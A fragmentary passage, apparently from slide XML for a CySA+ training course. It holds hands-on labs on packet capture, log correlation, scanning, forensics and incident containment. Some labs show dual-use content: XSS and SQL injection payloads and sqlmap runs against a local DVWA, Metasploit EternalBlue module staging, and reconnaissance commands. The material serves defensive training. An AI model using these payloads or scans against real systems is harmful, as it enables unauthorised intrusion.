            <a:ext cx="819272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prompted by tshark, answer "No" — non-root packet capture is not needed inside Killercoda.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tshark curl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Capture a known-traffic sample to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writes a pcap, -G 10 -W 1 rotates after 10 seconds and stops.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-w /tmp/sample.pcap -G 10 -W 1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Extract DNS queries from the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a threat hunt this is how you spot DGA-style randomised domains, DNS tunnelling, or queries to known-bad domains.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'dns.flags.response==0' -T fields -e dns.qry.nam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Extract HTTP host headers and URIs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Cleartext HTTP requests reveal command-and-control URLs, downloaded second stages, and exfiltration endpoints.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http.request -T fields -e http.host -e http.requ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TLS SNI (server name indicator)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Even when payloads are encrypted, the SNI in the ClientHello tells you which host the client tried to reach — the single most useful field for…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'tls.handshake.type==1' -T fields -e tls.handsha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Top talkers / conversations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ranks IP pairs by bytes.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-q -z conv,ip | head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display filter while sniffing live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Display filters (Wireshark-style) are richer than BPF; they can match application-layer fields like http.user_agent or dns.qry.name contains "tor".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-i any -Y 'dns and ip.dst==8.8.8.8' -c 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Hunt a specific IOC across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threat-intel feed flags 93.184.216.34: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'ip.addr==93.184.216.34' -T fields -e frame.time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capture to a rotating pcap with tcpdump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capture to a rotating pcap with tcpdump.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extract DNS, HTTP, and TLS SNI fields with tshark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extract DNS, HTTP, and TLS SNI fields with tshark.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rank top talkers and pivot on a specific IOC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rank top talkers and pivot on a specific IOC.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CySA+ 1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CySA+ 1.3 muscle memory for any packet-capture exam question.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SIEM Log Correlation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0700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78508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64208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2011680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 this lab you will play the role of a SIEM: ingesting raw logs from multiple sources, normalising them, and correla...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25496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73152" cy="1207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081528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2676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3008376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355848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Killercoda Ubuntu Playground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9664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69664"/>
            <a:ext cx="73152" cy="1207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42569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66844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4352544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CySA+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700016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1.3 - SIEM, SOAR, Log analysis/correlation.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 and seed sample logs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Extract structured fields with awk (parsing)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Output: timestamp + source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'/Failed password/ {print $1, $(NF-3)}' auth.log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Count failures per IP (aggregation)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core SIEM aggregation: 5  203.0.113.7, 1  198.51.100.4.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Correlate failed brute-force with successful login (rule logic)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same IP that produced ≥ 5 failures ever produces an Accepted — that is a confirmed credential-stuffing success.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bad_ip=$(grep "Failed password" auth.log | awk '{print $(NF-3)}' | sort | uniq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a second data source (web logs)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now know the attacker authenticated and immediately hit /admin and uploaded a file — likely a web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"$bad_ip" web.log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Work with structured JSON logs (jq)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Suricata, Zeek, AWS CloudTrail, and most modern tools emit JSON.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events.json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a one-line "detection rule"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Any IP printed is on both sides — failed AND succeeded.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join -1 1 -2 1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Parse, aggregate, and correlate logs across multiple sourc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Parse, aggregate, and correlate logs across multiple sources.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brute-force-then-success detection by hand - the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brute-force-then-success detection by hand - the algorithm under every SIEM "use case".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Work with both unstructured syslog and structured JSON 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Work with both unstructured syslog and structured JSON events.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Move from raw log to actionable alert without leaving the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Move from raw log to actionable alert without leaving the shell.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Email Header Analysis (SPF/DKIM/DMARC)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an email header for impersonation indicators and inspect the three authentication standards — SPF, DKIM, and DMARC — that determine whether a sender is forging the From address. These are exam-blueprint items under CySA+ 1.3 (Email analysis — Header, Impersonation, DKIM, DMARC, SPF,…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(MXToolbox)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DNS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Look up an SPF record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SPF lists the IPs/hosts allowed to send mail for a domain.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google.com | grep spf1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Look up DKIM and DMARC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DKIM signatures live at a selector subdomain (e.g.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_dmarc.google.com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Analyse a suspicious raw header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the following spear-phishing-style header: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/tmp/header.eml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Trace the Received chain to find the true origin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Received headers are stacked top-down; the lowest one is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tac /tmp/header.eml | grep -E '^Received'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Check embedded links (CySA+ "Obfuscated links")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Phish emails hide the real destination behind plausible link text.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/tmp/body.txt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Validate against a public service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real triage, paste the full header into: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query SPF, DKIM, and DMARC records with dig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query SPF, DKIM, and DMARC records with dig.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read the Authentication-Results header to confirm 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read the Authentication-Results header to confirm forgery.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trace the Received chain to the true sender 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trace the Received chain to the true sender IP.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spot obfuscated / lookalike links in the email body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spot obfuscated / lookalike links in the email body.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Malware Triage with Hashing and VirusTotal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first-pass static malware triage: identify the file type, hash it, extract printable strings, write a YARA rule, and submit the hash to VirusTotal. These are exam-blueprint items under CySA+ 1.3 (File analysis — Hashing, Strings, VirusTotal, Sandboxing).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(VirusTotal)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e8186f7a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208" y="1600200"/>
            <a:ext cx="776927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binutils yara curl file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benign "suspicious" sample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will not download real malware.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/tmp/lab9 &amp;&amp; cd /tmp/lab9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file type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file reads the magic bytes — never trust the extension.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file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Hash the sample (chain-of-custody first step)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with SHA-256 for evidence; MD5/SHA-1 are still used by AV vendors but are cryptographically weak.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md5sum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strings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strings -n 6 sample.sh | head -20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Write a YARA rule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YARA rules let you sweep an estate for any file matching the IOCs you just found.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c2_beacon.yar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Lookup the hash on VirusTotal (free web)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your browser open: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Decide: clean, suspicious, or malicious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simple triage matrix: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file type with file (not extension)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file type with file (not extension).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Generate MD5/SHA-1/SHA-256 hashes for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Generate MD5/SHA-1/SHA-256 hashes for evidence.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Pull useful IOCs out of a binary with strings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Pull useful IOCs out of a binary with strings.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Write and run a YARA rule against a sample and a directory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Write and run a YARA rule against a sample and a directory sweep.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0740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457200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VirusTotal and free sandboxes to enrich a hash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490118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VirusTotal and free sandboxes to enrich a hash.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Threat Intelligence and MITRE ATT&amp;CK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enrich a suspicious IP with whois, AbuseIPDB, and Shodan, then map an observed behaviour to a MITRE ATT&amp;CK technique using the free Navigator. You will also script a tiny SOAR-style automation. This covers CySA+ 1.4 (Threat actors, TTP, Collection methods, Threat-intelligence sharing, Active…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(AbuseIPDB, ATT&amp;CK Navigator)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e5b2de8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129" y="1600200"/>
            <a:ext cx="8207437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whois curl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WHOIS lookup (Collection methods — Open source)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Things to look for in incident triage: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whois 8.8.8.8 | grep -Ei 'orgname|country|netrange|cidr'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AbuseIPDB API enrichment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AbuseIPDB gives an abuse-confidence score 0–100 for any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read -p "AbuseIPDB API key (or press Enter to skip): " ABUSE_KEY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a small enrichment script (SOAR primitive)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a SOAR playbook in miniature: one IOC in, multiple sources queried, structured output ready to feed a ticket.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/tmp/enrich.sh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a behaviour to MITRE ATT&amp;CK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the MITRE ATT&amp;CK Navigator in your browser: https://mitre-attack.github.io/attack-navigator/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Recognise threat-actor categories (CySA+ 1.4 vocab)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Category | Motivation | Example artefact | |---|---|---| | APT (nation-state) | Espionage, long-dwell | Custom tooling, supply-chain compromise |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Threat-intelligence sharing formats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Real-world feeds use STIX/TAXII; the indicators travel between CERT, CSIRT, ISACs, and commercial paid feeds.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"203.0.113.99,malicious,c2,2026-05-13" &gt;&gt; /tmp/iocs.csv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Active defense and honeypots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defensive end of threat intelligence is deception.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netcat-openbsd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Enrich an IP with WHOIS, AbuseIPDB, and reverse DNS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Enrich an IP with WHOIS, AbuseIPDB, and reverse DNS.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one-shot SOAR enrichment script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one-shot SOAR enrichment script.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observed behaviour to MITRE ATT&amp;CK techniques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observed behaviour to MITRE ATT&amp;CK techniques.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Categorise threat actors and recognise the major sharing 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Categorise threat actors and recognise the major sharing feeds and formats.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2 · 30%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97785"/>
            <a:ext cx="4636008" cy="2609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Endpoint inspection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30%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Analysing scan results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Analysing scan results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 application vulnerabilities (XSS/SQLi)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Asset Discovery with Nmap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Nmap as both an asset-discovery tool and a passive/active fingerprinter. Asset inventory is the first step of every vulnerability management program — you cannot patch what you do not know exists. This maps to CySA+ 2.1 (Asset discovery — Map scans, Device fingerprinting; Internal vs external…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dc89e0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29242"/>
            <a:ext cx="11057839" cy="27596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Nmap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nmap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Host discovery (a "map scan")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map scan answers "what is alive on this subnet?" without a port scan.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-sn 127.0.0.0/29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Internal vs external scanning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Run the same scan against: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Active service / version detection (fingerprinting)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-sV probes each open port to identify the service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-T4 scanme.nmap.org -p 22,80,443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OS fingerprinting (active)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 sends crafted probes and matches TCP/IP stack quirks against its OS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-O -Pn scanme.nmap.org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Passive fingerprinting (alternative)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Active scans are noisy and can trip IDS rules.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p0f tcpdump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Credentialed vs non-credentialed (concept)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Nmap is non-credentialed.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Output formats for the inventory pipeline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-oA saves three formats simultaneously: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scanme.nmap.org -p 80,443 -oA /tmp/scan_inventory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Schedule a recurring scan (Special considerations)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CySA+ 2.1 lists "Scheduling, Operations, Performance, Sensitivity, Segmentation, Regulatory" as scan considerations.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"0 2 * * * root nmap -sn 10.0.0.0/24 -oG /var/log/asset-inventory-\$(date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ping-sweep map scan and version/OS fingerprint with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ping-sweep map scan and version/OS fingerprint with Nmap.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difference between active (Nmap) and passive (p0f) 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difference between active (Nmap) and passive (p0f) fingerprinting.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Internal vs external scan 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Internal vs external scan scope.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output Nmap data for pipeline consumption and sched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output Nmap data for pipeline consumption and schedule it.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Vulnerability Scanning with OpenVAS (Greenbone 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a full credentialed vulnerability scan with OpenVAS / Greenbone Community Edition, the free alternative to Nessus and Qualys. This maps directly to CySA+ 2.2 (Vulnerability scanners — Nessus, OpenVAS) and 2.1 (Agent vs agentless, Credentialed vs non-credentialed, Industry frameworks).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Local VM — Greenbone Community Edition (VirtualBox/VMware)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982d7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90860"/>
            <a:ext cx="5391759" cy="3436399"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6" descr="img_df975392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91498"/>
            <a:ext cx="5391759" cy="20351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Download the free Greenbone CE virtual appliance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https://www.greenbone.net/en/community-edition/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Boot, set admin password, sign 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Import the OVA into VirtualBox, give it 4 GB RAM and a bridged adapter.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Add a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Greenbone Security Assistant web UI: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(Optional) Add credentials — credentialed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credentialed scan can read patch level, kernel version, and config files — finding 5–10× the issues of a network-only scan.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Create and run a scan task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Scan length depends on host count and scan config — a single VM completes in 10–30 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Read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the task says Done, click into the report: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Agent vs agentless distinction (CySA+ 2.1)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| Agentless (what you just did) | Agent-based | |---|---|---| | Install on target | No | Yes (Wazuh, OSSEC, vendor) | | Network coverage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Special considerations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scheduling production scans, satisfy CySA+ 2.1's six items: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Industry frameworks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Greenbone scan policies map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Stand up Greenbone CE / OpenVAS as a free Nessus alternati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Stand up Greenbone CE / OpenVAS as a free Nessus alternative.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Create a target, add credentials, run a scan, and read the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Create a target, add credentials, run a scan, and read the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agent-vs-agentless trade-offs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agent-vs-agentless trade-offs.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scan configurations align to PCI, CIS, ISO, and OWASP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scan configurations align to PCI, CIS, ISO, and OWASP frameworks.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Web App Scanning with OWASP ZAP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OWASP ZAP against the deliberately vulnerable DVWA to surface XSS, SQLi, and CSRF findings. This is exam-blueprint CySA+ 2.2 (Web application scanners — ZAP, Burp, Arachni, Nikto).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ZAP CLI and Docker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zaproxy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Start the DVWA vulnerable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 once with credentials admin / password, then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run -d --name dvwa -p 8080:80 vulnerables/web-dvwa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Run a ZAP baseline scan (passive, fast)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baseline scan only observes traffic — it will not break the app.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zap-baseline.py -t http://127.0.0.1:8080 -r /tmp/zap_baseline.html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full active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full scan actively injects payloads and is what you would run in a staging environment.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zap-full-scan.py -t http://127.0.0.1:8080 -r /tmp/zap_full.html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ZAP alerts to OWASP Top 10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Major ZAP alert classes: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Authenticated scan (deep coverage)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ZAP can log in for you and crawl behind auth.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evidence and tear down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report files; they become evidence for the remediation team and auditors.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/tmp/zap_full.html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passive and an active OWASP ZAP scan against DVWA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passive and an active OWASP ZAP scan against DVWA.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Read ZAP HTML reports and map findings to OWASP Top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Read ZAP HTML reports and map findings to OWASP Top 10.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difference between baseline (safe) and full (intrusive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difference between baseline (safe) and full (intrusive) scans.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authenticated scans surface deeper findings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authenticated scans surface deeper findings.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Web Recon with Nikto and Burp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web-server reconnaissance with Nikto and intercept/replay requests with Burp Suite Community. Together they cover CySA+ 2.2 (Web application scanners — Burp Suite, Nikto) and reinforce 2.4 (Recommended controls).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Local (Burp Suite Community)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Nikto and start a target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nikto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Run a Nikto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Typical Nikto findings on DVWA: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http://127.0.0.1:8080 -o /tmp/nikto.txt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Tune Nikto with plugins and tuning options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-Tuning numbers from the man page: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http://127.0.0.1:8080 -Tuning 4 -Plugins "headers"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Install Burp Suite Community on your own laptop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Download: https://portswigger.net/burp/communitydownload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your browser to use Burp's proxy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Intercept and modify a request (the killer Burp workflow)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intercept/modify/replay loop is how analysts manually verify XSS, SQLi, IDOR, and CSRF findings flagged by automated scanners.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Send to Intruder for fuzzing (Community is rate-limited but functional)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Differences in response length are the classic signal of a successful injection.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Combine Nikto + Burp into a single workflow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Phase | Tool | |---|---| | Quick automated baseline | Nikto | | Deep crawl + scanner | OWASP ZAP (Lab 13) | | Manual verification &amp; exploit | Burp…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Nikto scan and read its prefixed OSVDB/CVE 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Nikto scan and read its prefixed OSVDB/CVE references.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Burp Suite Community and route browser traffic thr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Burp Suite Community and route browser traffic through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Intercept, modify, and replay HTTP requests with Repeater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Intercept, modify, and replay HTTP requests with Repeater.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Fuzz a parameter with Intruder and interpret length/status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Fuzz a parameter with Intruder and interpret length/status diff.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Metasploit Framework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the Metasploit Framework (MSF) as an analyst — not to break systems but to validate that a vulnerability scanner finding is actually exploitable, which is the heart of CySA+ 2.3 (Validation — true positive/negative, Exploitability/weaponization) and 2.2 (Multipurpose — MSF, Nmap, Recon-ng).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2b6565e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13290"/>
            <a:ext cx="11057839" cy="4191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Metasploit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msfdb init sets up the Postgres backend so search and host tracking work.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metasploit-framework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Launch the console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-q skips the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msfconsole -q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Search for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OpenVAS report flagged EternalBlue (CVE-2017-0144) on a Windows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Configure and stage (do not run — analyst view)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check is the safe analyst command: it probes the target and reports vulnerable / not vulnerable without firing the exploit.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exploit/windows/smb/ms17_010_eternalblue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Use an auxiliary scanner instead of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Many MSF modules are non-destructive scanners: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auxiliary/scanner/smb/smb_ms17_010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Browse useful module families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Family | Purpose | |---|---| | exploit/ | Active code-execution modules | | auxiliary/scanner/ | Vulnerability / version checks | | auxiliary/dos/…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type:auxiliary scanner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Workspaces and reporting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db_nmap runs Nmap and stores results in the Postgres DB.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workspace -a customer_x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MSF activity to CySA+ exploitability/weaponization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MSF feature | CySA+ 2.3 vocab | |---|---|---| | Will it run?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Exit cleanly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Metasploit and search for an exploit by name or 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Metasploit and search for an exploit by name or CVE.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Configure a module, set RHOST/LHOST/PAYLOAD, and run a non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Configure a module, set RHOST/LHOST/PAYLOAD, and run a non-destructive check.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auxiliary scanners to validate scanner findings at sca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auxiliary scanners to validate scanner findings at scale.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Persist findings via the MSF database and export them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Persist findings via the MSF database and export them.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CVSS Scoring and Prioritization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score three vulnerabilities with the FIRST CVSS v3.1 calculator, apply environmental context, and produce a prioritised remediation list. This is exam-blueprint CySA+ 2.3 (CVSS interpretation, Context awareness, Asset value, Zero-day).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FIRST CVSS v3.1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Open the CVSS v3.1 calculator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https://www.first.org/cvss/calculator/3.1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Memorise the eight Base metrics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Metric | Options | What it means | |---|---|---| | AV Attack Vector | N / A / L / P | Network / Adjacent / Local / Physical | | AC Attack…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Score Vuln #1 — Unauthenticated RCE on a public web server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UI:N / S:U / C:H / I:H / A:H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CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H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Score Vuln #2 — Local privilege escalation on a workstation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AV:L / AC:L / PR:L / UI:N / S:U / C:H / I:H / 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Score Vuln #3 — Reflected XSS that requires a click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UI:R / S:C / C:L / I:L / A:N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Apply Environmental metrics (context awareness)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CySA+ 2.3 calls out internal / external / isolated and asset value.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prioritised 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/tmp/prio.csv (open a shell on Killercoda or your laptop):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Handle zero-days and exploitability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Zero-day = no patch exists yet.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Validation (CySA+ 2.3 — true/false positive/negative)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scanner finding may be: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Score a Base CVSS vector for three realistic vulnerabiliti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Score a Base CVSS vector for three realistic vulnerabilities.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environmental context to demote or promote a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environmental context to demote or promote a score.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Cross-reference exploit databases for weaponisation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Cross-reference exploit databases for weaponisation status.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Produce a defensible, business-aware remediation priority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Produce a defensible, business-aware remediation priority list.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Exploiting and Mitigating XSS and SQL Injection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exploit a reflected XSS, a stored XSS, and a SQL injection on DVWA — then implement the standard mitigations (input validation, output encoding, parameterised queries, prepared statements). This maps to CySA+ 2.4 (Cross-site scripting, Injection flaws) and the Secure coding best practices sub-list.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b9c17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93649"/>
            <a:ext cx="5391759" cy="2230822"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6" descr="img_89d1b25c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12917"/>
            <a:ext cx="5391759" cy="29922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Start DVWA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http://127.0.0.1:8080, login admin / password, set DVWA Security = low,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docker.io sqlmap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Reflected XSS (CySA+ "XSS — Reflected")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DVWA endpoint vulnerabilities/xss_r/?name= echoes input straight into HTML.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"http://127.0.0.1:8080/vulnerabilities/xss_r/?name=&lt;scrip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Stored XSS (CySA+ "XSS — Persistent")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vulnerabilities/xss_s/ posts a guestbook message that is stored in MySQL and rendered to every visitor.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-d "txtName=mal&amp;mtxMessage=&lt;script&gt;alert('stored')&lt;/scrip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SQL Injection — manual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vulnerabilities/sqli/?id= builds a SQL query by concatenation.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"http://127.0.0.1:8080/vulnerabilities/sqli/?id=1%27%20OR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SQL Injection — automated with sqlmap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sqlmap will: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sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit"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Mitigation: parameterised queries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only correct fix for SQLi is parameterised queries / prepared statements.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$stmt = $pdo-&gt;prepare('SELECT first_name, last_name FROM users WHERE user_id =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the lab to CySA+ 2.4 secure-coding bullets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Secure coding bullet | |---|---| | 2, 3 | Output encoding | | 3 | Session management (HttpOnly, SameSite cookies stop XSS-driven session…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Trigger and recognise reflected XSS, stored XSS, and SQL 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Trigger and recognise reflected XSS, stored XSS, and SQL injection.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curl and sqlmap to validate scanner findings end-to-en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curl and sqlmap to validate scanner findings end-to-end.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correct primary mitigation for each class (encoding, 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correct primary mitigation for each class (encoding, validation, parameterisation).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link between the OWASP/DVWA exercises and CySA+ 2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link between the OWASP/DVWA exercises and CySA+ 2.4 secure-coding bullets.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Patch Management and Hardening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configure automated patching, list every unpatched CVE on the host, validate a patch with a smoke-test rollback path, and re-score with lynis. This maps to CySA+ 2.5 (Patching and configuration management — Testing / Implementation / Rollback / Validation, Maintenance windows, Attack surface…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patching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unattended-upgrades debsecan lynis needrestart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List every unpatched CVE on the host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debsecan reads Debian / Ubuntu security tracker data and prints unfixed CVEs by package.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--format=summary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Enable unattended security upgrades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20auto-upgrades does not exist, create it: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dpkg-reconfigure -plow unattended-upgrades 2&gt;/dev/null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Test before patching (CySA+ "Testing")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Patches break things.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/etc/ssh/sshd_config &gt; /tmp/preupdate.hash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Apply the patch (CySA+ "Implementation")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a real maintenance window you would post-notify stakeholders, then move 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DEBIAN_FRONTEND=noninteractive apt -y upgrade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Validate the patch (CySA+ "Validation")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a critical service is broken, you trigger the rollback plan.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--only-fixed | wc -l   # should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Rollback plan (CySA+ "Rollback")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real rollback strategy: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Attack surface reduction (CySA+ 2.5)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patch closes a single vuln.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list --installed 2&gt;/dev/null | wc -l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Re-score with lynis (CySA+ "Compensating control")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Compare against the score from Lab 2.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 --quiet | tail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Maintenance window playbook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template you can drop into Lab 25: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List unpatched CVEs with debsecan and prioritise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List unpatched CVEs with debsecan and prioritise.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Enable Ubuntu unattended security upgrades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Enable Ubuntu unattended security upgrades.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the Test to Implement to Validate to Rollback sequence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the Test to Implement to Validate to Rollback sequence.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Reduce attack surface by removing unused packages and serv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Reduce attack surface by removing unused packages and services.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0740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457200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lynis to demonstrate a measurable hardening improvemen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490118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lynis to demonstrate a measurable hardening improvement.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Attack Surface Reconnaissance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enumerate the external attack surface of a target organisation using theHarvester and recon-ng, plus free web services like crt.sh, DNSDumpster, and Shodan. This maps to CySA+ 2.5 (Attack surface management — Edge discovery, Passive discovery, Penetration testing, Bug bounty) and 2.2 (Multipurpose…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theharvester recon-ng curl whois dnsutils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Passive discovery with theHarvester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-b selects sources.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theHarvester -d example.com -b duckduckgo,crtsh,bing -l 100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Certificate-transparency search (edge discovery)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Certificate Transparency logs are the single best free subdomain discovery source — every TLS cert ever issued is public.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'https://crt.sh/?q=%25.example.com&amp;output=json' | jq -r '.[].name_valu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Recon-ng modular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the recon-ng shell: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recon-ng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DNS enumeration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second command attempts a zone transfer.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sub in www mail vpn admin api dev staging test mx ftp;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Shodan-style passive port discovery (browser)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Free tier (sign up required):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Inventory the findings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deliverable a SOC analyst hands to the vulnerability-management team.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/tmp/lab19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the lab to CySA+ 2.5 bullet points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Lab step | CySA+ 2.5 vocab | |---|---| | theHarvester / crt.sh / DNS | Edge discovery, Passive discovery | | Recon-ng hackertarget | Passive…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theHarvester and crt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theHarvester and crt.sh for passive subdomain discovery.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Drive Recon-ng's workspace/module model and export reports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Drive Recon-ng's workspace/module model and export reports.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Combine DNS, certificate transparency, and Shodan-style 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Combine DNS, certificate transparency, and Shodan-style services into a single external inventory.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enumeration techniques to CySA+ attack-surface-managem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enumeration techniques to CySA+ attack-surface-management vocabulary.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3 · 20%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Incident Response and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 analysis for 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 analysis for IR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Containment &amp; isolation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Cyber Kill Chain and ATT&amp;CK Mapping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walk a single intrusion scenario through Lockheed Martin's Cyber Kill Chain, then map the same scenario to the MITRE ATT&amp;CK Navigator and the Diamond Model. This maps to CySA+ 3.1 (Cyber kill chains, Diamond Model of Intrusion Analysis, MITRE ATT&amp;CK, OSSTMM, OWASP Testing Guide).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MITRE ATT&amp;CK Navigator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34df8d5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316" y="1600200"/>
            <a:ext cx="3628984" cy="4617720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6" descr="img_0605d5ac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620" y="2612073"/>
            <a:ext cx="5391759" cy="25939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&gt; A finance department user opens an invoice attachment from alerts@secur1ty-paypal.com (Lab 8).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Map to the 7 stages of the Lockheed Cyber Kill Chain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What happened | IOC / artefact | |---|---|---| | 1.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Open MITRE ATT&amp;CK Navigator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https://mitre-attack.github.io/attack-navigator/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Tag the techniques used in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search box, find and select each of these.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Diamond Model of Intrusion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Fill in the four corners of the diamond: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Compare frameworks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Framework | Strength | When to use | |---|---|---| | Cyber Kill Chain | Simple 7-stage narrative | Exec briefing | | MITRE ATT&amp;CK | Rich TTP…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artefacts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artefacts feed into the incident report deliverable (Lab 27).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Walk a realistic intrusion through the 7-stage Cyber Kill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Walk a realistic intrusion through the 7-stage Cyber Kill Chain.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an ATT&amp;CK Navigator layer by mapping each scenario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an ATT&amp;CK Navigator layer by mapping each scenario step to a technique ID.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the Diamond Model to enumerate pivot opportunities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the Diamond Model to enumerate pivot opportunities.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Choose the right framework for the analytic question at ha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Choose the right framework for the analytic question at hand.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Evidence Acquisition and Chain of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a forensically sound image of a "compromised" disk and memory, generate hashes, fill in a chain-of-custody form, and verify integrity. This maps to CySA+ 3.2 (Evidence acquisitions — Chain of custody, Validating data integrity, Preservation, Legal hold).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c9d66737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80554"/>
            <a:ext cx="3503066" cy="2457011"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6" descr="img_fff18695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314" y="2888750"/>
            <a:ext cx="3503066" cy="2040620"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_a056dc19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700" y="2920483"/>
            <a:ext cx="3503066" cy="19771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order matters: order of volatility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touching the system, recall the volatility ladder (most-to-least volatile):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controlled "evidence"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an 8 MB "disk" with two artefacts.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/tmp/evidence /tmp/case_001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Hash the source BEFORE imaging (preservation)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hashes are recorded — MD5 for legacy compatibility, SHA-256 for cryptographic strength.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/tmp/evidence/suspect.img | tee /tmp/case_001/source.sha256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Make a bit-for-bit image (acquisition)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 engagements use a hardware write-blocker plus dcfldd or dc3dd (FTK Imager on Windows) — they hash on-the-fly and log every read error.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dd if=/tmp/evidence/suspect.img of=/tmp/case_001/image.dd bs=1M status=progres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Verify integrity (validating data integrity)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hashes match, the image is admissible.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/tmp/case_001/image.dd | tee /tmp/case_001/image.sha256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Capture volatile memory (memory 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Linux the standard free tools are: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avml 2&gt;/dev/null || echo "avml may need manual install"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chain-of-custody form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Every transfer of the evidence (analyst → locker → court) gets a new row.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/tmp/case_001/chain_of_custody.md &lt;&lt;EOF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Legal hold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legal hold suspends normal retention policies for evidence relevant to litigation or regulatory request.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chmod -w /tmp/case_001/image.dd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Working copies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analyse the working copy, never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cp /tmp/case_001/image.dd /tmp/case_001/working_copy.dd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order of volatility and why it dictates acquisition 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order of volatility and why it dictates acquisition sequence.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image a disk with dd and verify with SHA-256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image a disk with dd and verify with SHA-256.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Where Linux/Windows memory acquisition tools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Where Linux/Windows memory acquisition tools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fill a chain-of-custody form and apply a legal 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fill a chain-of-custody form and apply a legal hold.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Memory Forensics with Volatility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 memory image with Volatility 3 — listing processes, network connections, command lines, and pulling DLLs / injected code. Memory forensics finds artefacts that never touched disk (Cobalt Strike beacons, in-memory shellcode). This maps to CySA+ 3.2 (Data and log analysis, Evidence…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5e96aa3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732" y="1600200"/>
            <a:ext cx="963823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Volatility 3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Volatility 3 is a complete rewrite in Python 3 with built-in symbol management — no manual profile required.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 git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Obtain a sample memory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Public training images are large but free.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Example download (~30 MB):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 identifies the OS, build, and addresses Volatility will use for the analysis.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windows.info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List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Hunt hidden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row that appears in psscan but not pslist is a rootkit-hidden process.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windows.psscan       # scans pool, finds unlinked PIDs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Recover command lines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command line of a malicious process often contains the C2 URL, base64 payload, or -NoProfile -EncodedCommand … — your fastest IOC.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windows.cmdline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Network connections at time of capture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Maps PID → local IP:port → remote IP:port.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windows.netscan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DLL injection / code injection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malfind looks for memory regions marked RWX with PE headers or shellcode — a textbook process-injection indicator.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windows.dlllist --pid &lt;SUSPECT_PID&gt;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Dump a suspect process and triage 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 static artefact for AV/sandbox submission — derived from RAM only.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Linux memory images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Lab 21's AVML output, the equivalent plugins live under linux.*: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/tmp/case_001/memory.lime linux.pslist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and orient Volatility 3 against a memory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and orient Volatility 3 against a memory image.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Enumerate processes, hidden processes, command lines, and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Enumerate processes, hidden processes, command lines, and live connections.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Detect injected code with malfind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Detect injected code with malfind.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Dump processes to disk and feed them into Lab 9's static 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Dump processes to disk and feed them into Lab 9's static triage workflow.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Log Analysis for Incident Response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work an incident from a pile of journalctl and web-server logs: pivot from one IOC to the next, build a timeline, and produce the "Who, What, When, Where, Why" rows that feed the executive report. This maps to CySA+ 3.2 (Data and log analysis, IoC, Detection and analysis).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6438df1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839" y="1600200"/>
            <a:ext cx="650001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Seed a realistic log set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Triage with simple greps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5  203.0.113.7 flagged — the brute-force source.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Pivot to the first success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08:00:06 root from 203.0.113.7 — the brute-force succeeded after 5 tries in 5 seconds.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"Accepted" auth.log | grep 203.0.113.7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Pivot to the web layer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same IP uploaded shell.php two seconds after login and immediately executed id and cat /etc/shadow.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203.0.113.7 web.log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the data exfil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1.07 GB flow from 10.0.0.50 to 185.220.101.45 at 08:10 — the exfiltration.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"[0-9]{9,}" netflow.log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Build the incident timeline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table is dropped straight into the executive incident report (Lab 27) under "Timeline".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timeline.md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Use journalctl for live systems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On the real host, the same workflow against systemd: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journalctl _SYSTEMD_UNIT=ssh.service --since "2026-05-13 08:00" --until "2026-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IoC list extracted from the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Feed this list into the Threat Intel pipeline (Lab 10) and the containment script (Lab 24).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iocs.txt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Pivot across auth, web, and netflow logs from a single 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Pivot across auth, web, and netflow logs from a single starting IoC.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an incident timeline that maps cleanly to the kill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an incident timeline that maps cleanly to the kill chain.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journalctl to do the same on a live systemd host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journalctl to do the same on a live systemd host.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Produce a structured IoC list ready for containment and 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Produce a structured IoC list ready for containment and reporting.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Containment with Host Isolation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isolate a compromised host with iptables / nftables, apply compensating controls, and verify that the box can still reach the SOC analyst workstation but nothing else. This maps to CySA+ 3.2 (Containment, eradication, and recovery — Scope, Impact, Isolation, Remediation, Re-imaging, Compensating…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iptables nftables iproute2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Snapshot current connectivity (scope of impact)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Record what is talking to what — this is the "Scope" and "Impact" assessment.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addr | grep -A1 'state UP'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Define the SOC bastion (your management channel)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Containment that locks you out is useless.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SOC_IP=10.10.0.10      # your analyst workstation / EDR console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Apply a "network isolation" policy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host is now reachable only from the SOC bastion on port 22 — every other connection (including the attacker's C2) is dead.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Save the rules so isolation survives reboot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Without this, a reboot during eradication accidentally unisolates the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iptables-persistent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Kill active malicious connections (eradication start)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Killing connections before isolation lets them re-establish; after isolation they cannot.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Find the suspect process (Lab 5)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compensating controls (CySA+ "Compensating controls")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While the team eradicates, mitigate continued risk on neighbouring systems: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Re-imaging vs cleanup decision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Situation | Recommend | |---|---| | Kernel rootkit / MBR malware | Re-image | | Unknown extent of compromise | Re-image | | Web shell, single file,…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Verify isolation worked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should fail.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From the host (Killercoda terminal):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Document containment for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Drop this straight into Lab 27's incident report.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/tmp/containment.md &lt;&lt;EOF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Isolate a host with default-DROP firewall while keeping a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Isolate a host with default-DROP firewall while keeping a management channel.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Distinguish containment, eradication, and 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Distinguish containment, eradication, and recovery.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Decide between cleanup and re-imaging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Decide between cleanup and re-imaging.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compensating controls during the cleanup window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compensating controls during the cleanup window.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Incident Response Playbook and Tabletop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a NIST-aligned incident response plan, a one-page playbook, and run a 45-minute tabletop exercise against the scenario from Lab 20. This maps to CySA+ 3.3 (Preparation — IR plan, Tools, Playbooks, Tabletop, Training, BC/DR; Post-incident — Forensic analysis, Root cause, Lessons learned).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c65adb9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864" y="1600200"/>
